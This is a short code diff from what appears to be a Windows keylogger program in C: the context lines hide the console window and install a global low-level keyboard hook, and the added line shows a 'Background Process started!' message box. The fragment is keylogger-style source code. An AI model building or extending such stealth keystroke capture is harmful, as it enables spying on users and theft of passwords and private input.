@@ -61,6 +61,7 @@ int main() {
   Stealth = FindWindowA("ConsoleWindowClass", NULL);
   ShowWindow(Stealth, 0); // Hide Console window
   my_hook = SetWindowsHookEx(WH_KEYBOARD_LL, k_Callback1, NULL, 0);
+  MessageBox(NULL, "Background Process started!", "bluePoint", MB_OK);
   MSG msg;
   while (GetMessage(&msg, NULL, 0, 0) != 0) {
     TranslateMessage(&msg);
